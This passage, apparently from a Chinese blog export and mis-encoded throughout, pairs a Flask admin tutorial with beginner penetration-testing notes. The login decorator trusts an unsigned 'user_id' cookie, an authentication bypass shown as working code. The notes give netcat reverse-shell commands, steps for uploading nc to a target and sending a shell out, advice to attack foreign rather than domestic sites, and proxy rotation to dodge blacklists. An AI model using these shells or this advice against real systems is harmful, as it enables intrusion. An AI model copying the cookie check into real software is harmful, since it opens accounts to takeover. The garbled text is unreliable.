<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"><span class="comment">#è£…é¥°å™¨ ---ç™»å…¥éªŒè¯</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login_required</span>(<span class="params">fn</span>):</span><br><span class="line"><span class="meta">    @wraps(<span class="params">fn</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inner</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        user_id = request.cookies.get(<span class="string">&#x27;user_id&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">if</span> user_id:</span><br><span class="line">            user = AdminUserModel.query.get(user_id)</span><br><span class="line">            request.user = user</span><br><span class="line">            <span class="keyword">return</span> fn(*args, **kwargs)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> redirect(<span class="string">&#x27;/admin/login/&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> inner</span><br></pre></td></tr></table></figure>

<h3 id="2-å‰ç«¯jsä»£ç çš„ä¿®æ”¹"><a href="#2-å‰ç«¯jsä»£ç çš„ä¿®æ”¹" class="headerlink" title="2)å‰ç«¯jsä»£ç çš„ä¿®æ”¹"></a>2)å‰ç«¯jsä»£ç çš„ä¿®æ”¹</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    $(<span class="string">&quot;#main table tbody tr td a&quot;</span>).<span class="title function_">click</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> that = $(<span class="variable language_">this</span>);</span><br><span class="line">        <span class="keyword">var</span> id = that.<span class="title function_">attr</span>(<span class="string">&quot;aid&quot;</span>);  <span class="comment">//å¯¹åº”id</span></span><br><span class="line">        <span class="keyword">if</span> (event.<span class="property">srcElement</span>.<span class="property">outerText</span> == <span class="string">&quot;åˆ é™¤&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="title function_">confirm</span>(<span class="string">&quot;æ­¤æ“ä½œä¸å¯é€†ï¼Œæ˜¯å¦ç¡®è®¤ï¼Ÿ&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">                $.<span class="title function_">post</span>(<span class="string">&#x27;/admin/delarticle/&#x27;</span>, &#123;<span class="string">&#x27;id&#x27;</span>: id&#125;, <span class="keyword">function</span> (<span class="params">data</span>)&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(data.<span class="property">msg</span>)</span><br><span class="line">                    <span class="keyword">if</span>(data.<span class="property">code</span> == <span class="number">200</span>)&#123;</span><br><span class="line">                        location.<span class="title function_">reload</span>()</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="title function_">alert</span>(data.<span class="property">msg</span>)</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@admin.route(<span class="params"><span class="string">&#x27;/admin/delarticle/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin_del_article</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="built_in">id</span> = request.form.get(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">        article = ArticleModel.query.get(<span class="built_in">id</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            db.session.delete(article)</span><br><span class="line">            db.session.commit()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;e:&#x27;</span>, e)</span><br><span class="line">            db.session.rollback()</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;code&#x27;</span>: <span class="number">500</span>, <span class="string">&#x27;msg&#x27;</span>: <span class="string">&#x27;åˆ é™¤å¤±è´¥ï¼&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;code&#x27;</span>: <span class="number">200</span>, <span class="string">&#x27;msg&#x27;</span>: <span class="string">&#x27;åˆ é™¤æˆåŠŸï¼&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;code&#x27;</span>: <span class="number">400</span>, <span class="string">&#x27;msg&#x27;</span>: <span class="string">&#x27;è¯·æ±‚æ–¹å¼é”™è¯¯ï¼&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure>

<p>è¿›è¡Œå‰åç«¯çš„æ•°æ®äº¤äº’ï¼Œé€šè¿‡åˆ¤æ–­è¯·æ±‚æ–¹æ³•åŒºå†³å®šä¸åŒçš„æ“ä½œå¯¹äºè·¯ç”±è€Œè¨€ï¼Œä»è€Œå»å®ç°ä¸åŒçš„åŠŸèƒ½ï¼Œè¿™é‡Œå°±æ˜¯å»åˆ©ç”¨äº†jsonæ•°æ®ä¸å‰ç«¯çš„äº¤äº’ï¼Œä»è€Œå®Œæˆäº†é¡µé¢ç›¸åº”å’Œåå°æ•°æ®çš„å…³è”ã€‚</p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>flask</tag>
      </tags>
  </entry>
  <entry>
    <title>æ¸—é€æµ‹è¯•å­¦ä¹ ä¹‹è·¯</title>
    <url>/2023/11/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/</url>
    <content><![CDATA[<p>å·²ç»å†³å®šäº†å‡†å¤‡æš‘å‡çœ‹çœ‹å»æ‰¾ä¸ªå®ä¹ ï¼Œå¯¹äºwebæ‰‹æ¥è¯´ï¼Œæ¸—é€è‚¯å®šæ˜¯å¿…ä¸å¯å°‘çš„ï¼Œæ‰€ä»¥ä»ç°åœ¨å¼€å§‹ï¼Œä¹Ÿè¦æŠ“ç´§æ—¶é—´å»å¥½å¥½å­¦ä¸‹æ¸—é€çš„ç›¸å…³çŸ¥è¯†äº†ã€‚</p>
<span id="more"></span>

<h1 id="1ã€ç¬¬1å¤©ï¼šåŸºç¡€å…¥é—¨-æ“ä½œç³»ç»Ÿ-åè¯-æ–‡ä»¶ä¸‹è½½-åå¼¹SHELL-é˜²ç«å¢™ç»•è¿‡"><a href="#1ã€ç¬¬1å¤©ï¼šåŸºç¡€å…¥é—¨-æ“ä½œç³»ç»Ÿ-åè¯-æ–‡ä»¶ä¸‹è½½-åå¼¹SHELL-é˜²ç«å¢™ç»•è¿‡" class="headerlink" title="1ã€ç¬¬1å¤©ï¼šåŸºç¡€å…¥é—¨-æ“ä½œç³»ç»Ÿ&amp;åè¯&amp;æ–‡ä»¶ä¸‹è½½&amp;åå¼¹SHELL&amp;é˜²ç«å¢™ç»•è¿‡"></a>1ã€ç¬¬1å¤©ï¼šåŸºç¡€å…¥é—¨-æ“ä½œç³»ç»Ÿ&amp;åè¯&amp;æ–‡ä»¶ä¸‹è½½&amp;åå¼¹SHELL&amp;é˜²ç«å¢™ç»•è¿‡</h1><blockquote>
<p>ä¸€äº›å‚è€ƒçš„èµ„æ–™å·¥å…·ç½‘ç«™</p>
<p>æ¸—é€å¸¸è§æœ¯è¯­<a href="https://www.cnblogs.com/sunny11/p/13583083.html">https://www.cnblogs.com/sunny11/p/13583083.html</a></p>
<p>è±è§’ç¤¾åŒºï¼š<a href="https://forum.ywhack.com/bountytips.php?download">https://forum.ywhack.com/bountytips.php?download</a></p>
<p>åå¼¹shellï¼š<a href="https://forum.ywhack.com/reverse-shell/">https://forum.ywhack.com/reverse-shell/</a></p>
<p>å¸¸è§å‘½ä»¤ï¼š<a href="https://blog.csdn.net/weixin_43303273/article/details/83029138">https://blog.csdn.net/weixin_43303273/article/details/83029138</a></p>
</blockquote>
<h2 id="1ã€å†…ç½‘ä¸å¤–ç½‘çš„åŒºåˆ«"><a href="#1ã€å†…ç½‘ä¸å¤–ç½‘çš„åŒºåˆ«" class="headerlink" title="1ã€å†…ç½‘ä¸å¤–ç½‘çš„åŒºåˆ«"></a>1ã€å†…ç½‘ä¸å¤–ç½‘çš„åŒºåˆ«</h2><p>å¤–ç½‘å°±æ˜¯æ­£å¸¸æˆ‘ä»¬ä½¿ç”¨çš„æœåŠ¡å™¨é‚£ç§çš„ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡ipåœ°å€å»è®¿é—®ï¼Œè€Œå†…ç½‘åˆ™æ˜¯åœ¨ä¸€å°èŒƒå›´ä¸­ä½¿ç”¨çš„ï¼Œæ— æ³•ç›´æ¥é€šè¿‡å…¶ipåœ°å€å»ç›´æ¥æ‰¾åˆ°ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬åªèƒ½é€šè¿‡å»ºç«‹é€šé“æˆ–è€…ç«¯å£æŒ‡å®šä»è€Œå»æŒ‡å®šåˆ°æˆ‘ä»¬éœ€è¦è®¿é—®çš„å†…ç½‘ï¼Œå°±æ¯”å¦‚è™šæ‹Ÿæœºçš„ipï¼Œå°±ç›¸å½“äºä¸€ä¸ªå†…ç½‘åœ°å€ã€‚</p>
<h2 id="2ã€å‡ºç½‘å’Œè¿›ç½‘"><a href="#2ã€å‡ºç½‘å’Œè¿›ç½‘" class="headerlink" title="2ã€å‡ºç½‘å’Œè¿›ç½‘"></a>2ã€å‡ºç½‘å’Œè¿›ç½‘</h2><p>Windowsçš„é˜²ç«å¢™å¯¹äºå‡ºç½‘é™åˆ¶å¾ˆå°‘ï¼Œè€Œå¯¹äºè¿›ç½‘åˆ™æœ‰ç€å¾ˆå¤§çš„é™åˆ¶ã€‚</p>
<p>æ‰€ä»¥åœ¨ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä½¿ç”¨å¸¦æœ‰é˜²ç«å¢™çš„ä¸»æœºå»å°†cmdæƒé™å‘å‡ºï¼Œä½¿ç”¨æ²¡æœ‰é˜²ç«å¢™çš„ä¸»æœºå»è¿æ¥ï¼Œé˜²ç«å¢™è¿™æ ·å°±ä¸ä¼šèµ·åˆ°é˜»æ‹¦çš„ä½œç”¨äº†ã€‚</p>
<h2 id="3ã€åå¼¹shell"><a href="#3ã€åå¼¹shell" class="headerlink" title="3ã€åå¼¹shell"></a>3ã€åå¼¹shell</h2><blockquote>
<p>Windowsï¼šnc -e cmd ip port</p>
<p>Linux:   nc -e &#x2F;bin&#x2F;bash ip port</p>
</blockquote>
<p>å†…ç½‘å¯ä»¥è¿æ¥å¤–ç½‘ï¼Œå¤–ç½‘æ— æ³•å»è¿æ¥å†…ç½‘ã€‚</p>
<h2 id="4ã€å®æˆ˜"><a href="#4ã€å®æˆ˜" class="headerlink" title="4ã€å®æˆ˜"></a>4ã€å®æˆ˜</h2><p>â‘ å°†cmdä¸Šä¼ è‡³ç›®æ ‡æœåŠ¡å™¨</p>
<p>â‘¡å°†cmdæƒé™å‘å‡ºï¼Œå¹¶ä½¿ç”¨å¤–ç½‘ä¸»æœºæ¥å—</p>
<p>â‘¢æ‹¿åˆ°æƒé™ï¼Œä»è€Œå»å®Œæˆæ¸—é€</p>
<p>ä¾‹å­ï¼šPikachué¶åœºçš„æ”»ç ´</p>
<p>1ã€ä¿¡æ¯æ”¶é›†ï¼Œå¯»æ‰¾ç›®æ ‡</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-04-04/0f5af17a529d67961e925aa6be75884d--b4a3--image-20240404103555177.png" alt="image-20240404103555177"></p>
<p>è¿™è¾¹ç»™ä¸ªå°å»ºè®®ï¼Œåˆ«æ‰“å›½å†…çš„ï¼Œæœ€å¥½å›½å¤–çš„</p>
<p>2ã€åˆ¤æ–­æ˜¯å¦æœ‰æ”»å‡»åˆ©ç”¨çš„æ¡ä»¶</p>
<p>ï¼ˆå®åœ¨æ˜¯ç°åœ¨æ‰¾ä¸åˆ°äº†ï¼Œå¤§éƒ¨åˆ†å·²ç»éƒ½å®Œå…¨ä¿®å¤äº†ï¼‰</p>
<p>3ã€æœ€åå°±æ˜¯è¿œç¨‹ä¸‹è½½ncï¼Œå¹¶å°†shellå‘å‡ºå»ï¼Œè¿™æ ·å°±æ‹¿åˆ°äº†æƒé™ã€‚</p>
<h1 id="2ã€ç¬¬2å¤©ï¼šåŸºç¡€å…¥é—¨-Webåº”ç”¨-æ¶æ„æ­å»º-æ¼æ´-HTTPæ•°æ®åŒ…-ä»£ç†æœåŠ¡å™¨"><a href="#2ã€ç¬¬2å¤©ï¼šåŸºç¡€å…¥é—¨-Webåº”ç”¨-æ¶æ„æ­å»º-æ¼æ´-HTTPæ•°æ®åŒ…-ä»£ç†æœåŠ¡å™¨" class="headerlink" title="2ã€ç¬¬2å¤©ï¼šåŸºç¡€å…¥é—¨-Webåº”ç”¨&amp;æ¶æ„æ­å»º&amp;æ¼æ´&amp;HTTPæ•°æ®åŒ…&amp;ä»£ç†æœåŠ¡å™¨"></a>2ã€ç¬¬2å¤©ï¼šåŸºç¡€å…¥é—¨-Webåº”ç”¨&amp;æ¶æ„æ­å»º&amp;æ¼æ´&amp;HTTPæ•°æ®åŒ…&amp;ä»£ç†æœåŠ¡å™¨</h1><h2 id="1ã€ç½‘ç«™çš„å¼€å‘"><a href="#1ã€ç½‘ç«™çš„å¼€å‘" class="headerlink" title="1ã€ç½‘ç«™çš„å¼€å‘"></a>1ã€ç½‘ç«™çš„å¼€å‘</h2><p>è¿™é‡Œä¹Ÿå°±æ˜¯ä¸€äº›åŸºç¡€çš„webçŸ¥è¯†äº†ï¼Œå­¦ä¼šå»è´­ä¹°æœåŠ¡å™¨ï¼ŒåŸŸåç­‰ï¼Œå¹¶ä¸”ä»¥æ­¤å»æ­å»ºä¸€ä¸ªè‡ªå·±çš„åšå®¢é¡¹ç›®ï¼Œè¿™æ ·ä¹Ÿèƒ½å»æ›´å¥½çš„ç†è§£ä¸€ä¸‹ç½‘ç«™çš„ç»“æ„ç­‰ç›¸å…³çŸ¥è¯†ã€‚åœ¨è¿™é‡Œå°±ä¸è¿‡å¤šçš„å»è®²è§£äº†ï¼Œè¿™éƒ½å¯ä»¥è‡ªå·±è·Ÿç€ç½‘ä¸Šçš„èµ„æ–™å»å­¦ä¹ çš„ã€‚</p>
<h2 id="2ã€webåº”ç”¨æ¡†æ¶"><a href="#2ã€webåº”ç”¨æ¡†æ¶" class="headerlink" title="2ã€webåº”ç”¨æ¡†æ¶"></a>2ã€webåº”ç”¨æ¡†æ¶</h2><p>ç†è§£ä¸åŒWEBåº”ç”¨ç»„æˆè§’è‰²åŠŸèƒ½æ¶æ„ï¼š</p>
<p>å¼€å‘è¯­è¨€ï¼Œç¨‹åºæºç ï¼Œä¸­é—´ä»¶å®¹å™¨ï¼Œæ•°æ®åº“ç±»å‹ï¼ŒæœåŠ¡å™¨æ“ä½œç³»ç»Ÿï¼Œç¬¬ä¸‰æ–¹è½¯ä»¶ç­‰ã€‚</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-29/e0c18ac5a06e048e519805fbc591a642--032f--image-20231129155607968.png" alt="image-20231129155607968"></p>
<h2 id="3ã€ä»£ç†ä»¥åŠæŠ“åŒ…"><a href="#3ã€ä»£ç†ä»¥åŠæŠ“åŒ…" class="headerlink" title="3ã€ä»£ç†ä»¥åŠæŠ“åŒ…"></a>3ã€ä»£ç†ä»¥åŠæŠ“åŒ…</h2><p>å¯ä»¥ä½¿ç”¨bpå»å®ç°æŠ“åˆ°è¯·æ±‚åŒ…ï¼Œå¹¶ä¸”å»ä¿®æ”¹ä»è€Œè¾¾åˆ°æˆ‘ä»¬æƒ³è¦çš„æ•ˆæœã€‚</p>
<p>ç„¶åå°±æ˜¯å¯ä»¥æ ¹æ®å“åº”åŒ…çš„çŠ¶æ€ç å»åˆ¤æ–­çŠ¶æ€ã€‚</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-29/f9ff913739a0803b75f280912eff5134--c28f--image-20231129155736090.png" alt="image-20231129155736090"></p>
<h2 id="4ã€ä»£ç†è´­ä¹°çš„ä½œç”¨"><a href="#4ã€ä»£ç†è´­ä¹°çš„ä½œç”¨" class="headerlink" title="4ã€ä»£ç†è´­ä¹°çš„ä½œç”¨"></a>4ã€ä»£ç†è´­ä¹°çš„ä½œç”¨</h2><p>åœ¨ç½‘ä¸Šå»è´­ä¹°ä»£ç†ï¼Œå°±å¯ä»¥å®ç°æ¯æ¬¡ç‚¹å‡»ç½‘ç«™ä½¿ç”¨çš„å°±æ˜¯ä¸åŒçš„ipåœ°å€ï¼Œè¿™æ ·å°±èƒ½å»é˜²æ­¢è‡ªèº«çš„ipè¢«æ‹‰å…¥é»‘åå•åæ— æ³•è®¿é—®çš„é—®é¢˜ã€‚è´­ä¹°ä»£ç†å°±åƒæ˜¯åœ¨ä¸»æœºå’Œè¢«è®¿é—®æœåŠ¡å™¨ä¹‹é—´æ–°å¢äº†ä¸€ä¸ªä»£ç†æœåŠ¡å™¨ï¼Œç”±è¿™ä¸ªæœåŠ¡å™¨æŠŠä½ çš„è¯·æ±‚æ‹¦æˆªå¹¶ç”±å®ƒå‘å‡ºï¼Œæœ€åæ¥æ”¶åˆ°çš„è¿”å›åŒ…ä¹Ÿç”±å®ƒç»æ‰‹è¿”å›</p>
<h1 id="ç¬¬3å¤©ï¼šåŸºç¡€å…¥é—¨-æŠ“åŒ…-å°åŒ…-åè®®-APP-å°ç¨‹åº-PCåº”-WEBåº”ç”¨"><a href="#ç¬¬3å¤©ï¼šåŸºç¡€å…¥é—¨-æŠ“åŒ…-å°åŒ…-åè®®-APP-å°ç¨‹åº-PCåº”-WEBåº”ç”¨" class="headerlink" title="ç¬¬3å¤©ï¼šåŸºç¡€å…¥é—¨-æŠ“åŒ…&amp;å°åŒ…&amp;åè®®&amp;APP&amp;å°ç¨‹åº&amp;PCåº”&amp;WEBåº”ç”¨"></a>ç¬¬3å¤©ï¼šåŸºç¡€å…¥é—¨-æŠ“åŒ…&amp;å°åŒ…&amp;åè®®&amp;APP&amp;å°ç¨‹åº&amp;PCåº”&amp;WEBåº”ç”¨</h1><h2 id="1ã€é‡ç‚¹æ€»ç»“"><a href="#1ã€é‡ç‚¹æ€»ç»“" class="headerlink" title="1ã€é‡ç‚¹æ€»ç»“"></a>1ã€é‡ç‚¹æ€»ç»“</h2><p>â‘ ä¸ºä»€ä¹ˆè¦æŠ“åŒ…ï¼Ÿ -æŠ“åŒ…åº”ç”¨çš„èµ„äº§ä¿¡æ¯è¿›è¡Œå®‰å…¨æµ‹è¯•</p>
<p>â‘¡æŠ“åŒ…çš„å¯¹è±¡æœ‰å“ªäº›ï¼Ÿ -å°ç¨‹åºï¼ŒAPPï¼Œæ¡Œé¢åº”ç”¨ç­‰</p>
<p>â‘¢æŠ“åŒ…åè®®åŒºåˆ«å·¥å…·ï¼Ÿ -æœ‰éƒ¨åˆ†åº”ç”¨ä¸èµ°HTTP&#x2F;Sï¼Œéœ€è¦ç”¨åˆ°å…¨å±€åè®®æŠ“åŒ…</p>
<p>â‘£å°åŒ…å’ŒæŠ“åŒ…ä¸åŒä¹‹å¤„ï¼Ÿ  -é›¶æ•£æ•´ä½“çš„åŒºåˆ«ï¼Œå°åŒ…èƒ½ç²¾ç¡®åˆ°æ¯ä¸€ä¸ªæ“ä½œçš„æ•°æ®åŒ…ã€‚</p>
<h2 id="2ã€æ‰‹æœºAPPã€å°ç¨‹åºçš„æŠ“åŒ…"><a href="#2ã€æ‰‹æœºAPPã€å°ç¨‹åºçš„æŠ“åŒ…" class="headerlink" title="2ã€æ‰‹æœºAPPã€å°ç¨‹åºçš„æŠ“åŒ…"></a>2ã€æ‰‹æœºAPPã€å°ç¨‹åºçš„æŠ“åŒ…</h2><p>ä½¿ç”¨bpï¼ŒCharleså»æŠ“åŒ…ï¼Œå°ç¨‹åºçš„è¯ä¸æ–¹ä¾¿ä½¿ç”¨bpï¼Œä½¿ç”¨Charlesæ›´åŠ æ–¹ä¾¿ã€‚</p>
<p>bpæŠ“åŒ…èƒ½å¤Ÿç²¾å‡†å®šä½åˆ°æ¯ä¸€æ¬¡æ•°æ®åŒ…çš„å‘é€ã€‚</p>
<h2 id="3ã€å…¨å±€åè®®æŠ“åŒ…"><a href="#3ã€å…¨å±€åè®®æŠ“åŒ…" class="headerlink" title="3ã€å…¨å±€åè®®æŠ“åŒ…"></a>3ã€å…¨å±€åè®®æŠ“åŒ…</h2><p>å¯ä»¥å»ä½¿ç”¨ç§‘æ¥æˆ–è€…wiresharkå»æŠ“åŒ…ï¼Œç›´æ¥å¯¹å…¨å±€è¿›è¡ŒæŠ“åŒ…ï¼Œå¹¶ä¸åªå±€é™äºHTTPæ•°æ®åŒ…ï¼Œå¯ä»¥æ›´æ–¹ä¾¿çš„ç”¨äºå¯¹ä¸€äº›åº”ç”¨çš„æŠ“åŒ…ã€‚</p>
<h2 id="4ã€å°åŒ…"><a href="#4ã€å°åŒ…" class="headerlink" title="4ã€å°åŒ…"></a>4ã€å°åŒ…</h2><p>è¿™é‡Œå°±å¯ä»¥å»ä½¿ç”¨ä¸€ä¸ªå°åŒ…ç›‘å¬å·¥å…·ï¼Œå¯ä»¥å»ç›‘å¬æŸä¸ªè¿›ç¨‹çš„æ•°æ®åŒ…å¹¶ä¸”è¿›è¡Œå°åŒ…ï¼Œå°åŒ…çš„è¯å°±æ˜¯å¯ä»¥å°†æŸç§è¡Œä¸ºåŒ…è£…æˆä¸€ä¸ªæ•°æ®åŒ…ï¼Œæˆ‘ä»¬å°±å¯ä»¥é‡æ–°å»å‘é€è¿™ä¸ªæ•°æ®åŒ…å»é‡å¤æŸç§è¡Œä¸ºï¼Œæ›´åŠ ç²¾ç¡®ã€‚è¿™å°±å¾ˆæ–¹ä¾¿äºå¯¹äºæ¸¸æˆå¤–æŒ‚ç›¸å…³çš„åˆ¶ä½œã€‚</p>
<h2 id="5ã€ç›¸å…³è½¯ä»¶çš„ä»‹ç»"><a href="#5ã€ç›¸å…³è½¯ä»¶çš„ä»‹ç»" class="headerlink" title="5ã€ç›¸å…³è½¯ä»¶çš„ä»‹ç»"></a>5ã€ç›¸å…³è½¯ä»¶çš„ä»‹ç»</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#å‚è€ƒç‚¹ï¼š Fiddder: æ˜¯ä¸€ä¸ªhttpåè®®è°ƒè¯•ä»£ç†å·¥å…·ï¼Œå®ƒèƒ½å¤Ÿè®°å½•å¹¶æ£€æŸ¥æ‰€æœ‰ä½ çš„ç”µè„‘å’Œäº’è”ç½‘ä¹‹é—´çš„httpé€šè®¯ï¼Œè®¾ç½®æ–­ç‚¹ï¼ŒæŸ¥çœ‹æ‰€æœ‰çš„&quot;è¿›å‡º&quot;Fiddlerçš„æ•°æ®ï¼ˆæŒ‡cookie,html,j3,cssç­‰æ–‡ä»¶ï¼‰ã€‚Fiddlerè¦æ¯”å…¶ä»–çš„ç½‘ç»œè°ƒè¯•å™¨è¦æ›´åŠ ç®€å•ï¼Œå› ä¸ºå®ƒä¸ä»…ä»…æš´éœ²ttpé€šè®¯è¿˜æä¾›äº†ä¸€ä¸ªç”¨æˆ·å‹å¥½çš„æ ¼å¼ã€‚</span><br><span class="line">Charles:</span><br><span class="line">æ˜¯ä¸€ä¸ªHTTPä»£ç†æœåŠ¡å™¨ï¼ŒHTTPç›‘è§†å™¨ï¼Œåè½¬ä»£ç†æœåŠ¡å™¨ï¼Œå½“æµè§ˆå™¨è¿æ¥Charlesçš„ä»£ç†è®¿é—®äº’è”ç½‘æ—¶ï¼Œchar1eså¯ä»¥ç›‘æ§æµè§ˆå™¨å‘é€å’Œæ¥æ”¶çš„æ‰€æœ‰æ•°æ®ã€‚å®ƒå…è®¸ä¸€ä¸ªå¼€å‘è€…æŸ¥çœ‹æ‰€æœ‰è¿æ¥äº’è”ç½‘çš„HTTPé€šä¿¡ï¼Œè¿™äº›åŒ…æ‹¬cequest,respon3eå’ŒHTTP headers(åŒ…å«cookies.ä¸cachingä¿¡æ¯ï¼‰</span><br><span class="line">TCPDump:</span><br><span class="line">æ˜¯å¯ä»¥å°†ç½‘ç»œä¸­ä¼ é€çš„æ•°æ®åŒ…å®Œå…¨æˆªè·ä¸‹æ¥æä¾›åˆ†æã€‚å®ƒæ”¯æŒé’ˆå¯¹ç½‘ç»œå±‚ã€å</span><br><span class="line">è®®ã€ä¸»æœºã€ç½‘ç»œæˆ–ç«¯å£çš„è¿‡æ»¤ï¼Œå¹¶æä¾›andã€orã€notç­‰é€»è¾‘è¯­å¥æ¥å¸®åŠ©ä½ å»æ‰æ— ç”¨çš„ä¿¡æ¯ã€‚</span><br><span class="line">BurpSuite:</span><br><span class="line">æ˜¯ç”¨äºæ”»å‡»webåº”ç”¨ç¨‹åºçš„é›†æˆå¹³å°ï¼ŒåŒ…å«äº†è®¸å¤šå·¥å…·ã€‚Burp Suiteiä¸ºè¿™äº›å·¥å…·è®¾è®¡äº†è®¸å¤šæ¥å£ï¼Œä»¥åŠ å¿«æ”»å‡»åº”ç”¨ç¨‹åºçš„è¿‡ç¨‹ã€‚æ‰€æœ‰å·¥å…·éƒ½å…±äº«ä¸€ä¸ªè¯·æ±‚ï¼Œå¹¶èƒ½å¤„ç†å¯¹åº”çš„HTTPæ¶ˆæ¯ã€æŒä¹…æ€§ã€è®¤è¯ã€ä»£ç†ã€æ—¥å¿—ã€è­¦æŠ¥ã€‚</span><br><span class="line">Wireshark:</span><br><span class="line">æ˜¯ä¸€ä¸ªç½‘ç»œå°åŒ…åˆ†æè½¯ä»¶ã€‚ç½‘ç»œå°åŒ…åˆ†æè½¯ä»¶çš„åŠŸèƒ½æ˜¯æˆªå–ç½‘ç»œå°åŒ…ï¼Œå¹¶å°½</span><br><span class="line">å¯èƒ½æ˜¾ç¤ºå‡ºæœ€ä¸ºè¯¦ç»†çš„ç½‘ç»œå°åŒ…èµ„æ–™ã€‚Wiresharkä½¿ç”¨WinPCAPä½œä¸ºæ¥å£ï¼Œç›´æ¥ä¸ç½‘å¡è¿›</span><br><span class="line">è¡Œæ•°æ®æŠ¥æ–‡äº¤æ¢ã€‚</span><br><span class="line">ç§‘æ¥ç½‘ç»œåˆ†æç³»ç»Ÿï¼šæ˜¯ä¸€æ¬¾ç”±ç§‘æ¥è½¯ä»¶å…¨è‡ªä¸»ç ”å‘ï¼Œå¹¶æ‹¥æœ‰å…¨éƒ¨çŸ¥è¯†äº§å“çš„ç½‘ç»œåˆ†æäº§</span><br><span class="line">å“ã€‚è¯¥ç³»ç»Ÿå…·æœ‰è¡Œä¸šé¢†å…ˆçš„ä¸“å®¶åˆ†ææŠ€æœ¯ï¼Œé€šè¿‡æ•è·å¹¶åˆ†æç½‘ç»œä¸­ä¼ è¾“çš„åº•å±‚æ•°æ®åŒ…ï¼Œå¯¹</span><br><span class="line">ç½‘ç»œæ•…éšœã€ç½‘ç»œå®‰å…¨ä»¥åŠç½‘ç»œæ€§èƒ½è¿›è¡Œå…¨é¢åˆ†æï¼Œä»è€Œå¿«é€Ÿæ’æŸ¥ç½‘ç»œä¸­å‡ºç°æˆ–æ½œåœ¨çš„æ•…</span><br><span class="line">éšœã€å®‰å…¨åŠæ€§èƒ½é—®é¢˜ã€‚</span><br><span class="line">WPE&amp;å°åŒ…åˆ†æï¼šæ˜¯å¼ºå¤§çš„ç½‘ç»œå°åŒ…ç¼–è¾‘å™¨ï¼Œweå¯ä»¥æˆªå–ç½‘ç»œä¸Šçš„ä¿¡æ¯ï¼Œä¿®æ”¹å°åŒ…æ•°æ®</span><br><span class="line">æ˜¯å¤–æŒ‚åˆ¶ä½œçš„å¸¸ç”¨å·¥å…·ã€‚ä¸€èˆ¬åœ¨å®‰å…¨æµ‹è¯•ä¸­å¯ç”¨æ¥è°ƒè¯•æ•°æ®é€šè®¯åœ°å€ã€‚</span><br></pre></td></tr></table></figure>

